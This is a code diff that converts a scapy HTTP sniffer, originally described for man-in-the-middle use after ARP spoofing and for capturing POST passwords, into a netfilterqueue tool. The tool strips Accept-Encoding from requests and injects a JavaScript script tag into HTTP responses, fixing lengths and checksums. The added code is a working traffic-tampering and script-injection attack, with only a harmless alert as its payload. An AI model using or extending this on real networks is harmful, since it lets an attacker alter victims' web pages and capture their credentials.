@@ -1,6 +1,7 @@
 from scapy.all import *
 from colorama import init, Fore
-from scapy.layers.http import HTTPRequest
+import netfilterqueue
+import re
 
 
 init()
@@ -22,32 +23,66 @@ def sniff_packets(iface=None):
 
 def process_packet(packet):
    
+    spacket = IP(packet.get_payload())
+    if spacket[TCP].dport == 80:
+        print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
 
-    if packet.haslayer(HTTPRequest):
+        try:
+            load = spacket[Raw].load.decode()
+        except Exception as e:
+            packet.accept()
+            return
+        
+        new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
 
-       url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+        spacket[Raw].load = new_load
 
-       ip = packet[IP].src
+        spacket[IP].len = None
+        spacket[IP].chksum = None
+        spacket[TCP].chksum = None
 
-       method = packet[HTTPRequest].Method.decode()
+        packet.set_payload(bytes(spacket))
 
-       print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
+    if spacket[TCP].sport == 80:
+        print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
 
-       if show_raw and packet.haslayer(Raw) and method == "POST":
-        print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")
+        try:
+            load = spacket[Raw].load.decode()
+        except:
+            packet.accept()
+            return
 
+        added_text = "<script>alert('Javascript Injected successfully!');</script>"
 
+        added_text_length = len(added_text)
+
+        load = load.replace("</body>", added_text + "</body>")
+
+        if "Content-Length" in load:
+            content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
+
+            new_content_length = content_length + added_text_length
+
+            load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
+
+            if added_text in load:
+                print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")
+
+        
+        spacket[Raw].load = load
+
+        spacket[IP].len = None
+        spacket[IP].chksum = None
+        spacket[TCP].chksum = None
+
+        packet.set_payload(bytes(spacket))
+    
+    packet.accept()
 
 if __name__ == "__main__":
-    import argparse
 
-    parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
-                                                 + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
-    parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
-    parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
+   queue = netfilterqueue.NetfilterQueue()
 
-    args = parser.parse_args()
-    iface = args.iface
-    show_raw = args.show_raw
+   queue.bind(0, process_packet)
 
-    sniff_packets(iface)
+   queue.run()
